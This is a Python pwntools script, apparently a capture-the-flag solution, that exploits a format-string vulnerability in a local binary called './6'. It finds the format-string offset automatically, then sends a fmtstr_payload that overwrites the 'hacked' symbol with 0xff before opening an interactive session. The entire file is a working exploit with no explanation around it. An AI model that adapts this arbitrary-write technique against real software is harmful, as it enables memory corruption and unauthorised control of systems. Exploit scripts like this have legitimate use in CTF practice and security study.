from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('./6')
elf = ELF('./6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def exec_fmt(payload):
    p = process('./6')
    p.sendline(payload)
    return p.recvall(.5)

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
#offset = 0x6
log.success(f'offset: {hex(offset)}')

p = process('./6')

#gdb.attach(p)
payload = fmtstr_payload(offset, {elf.sym['hacked']: 0xff})
p.send(payload)

p.interactive()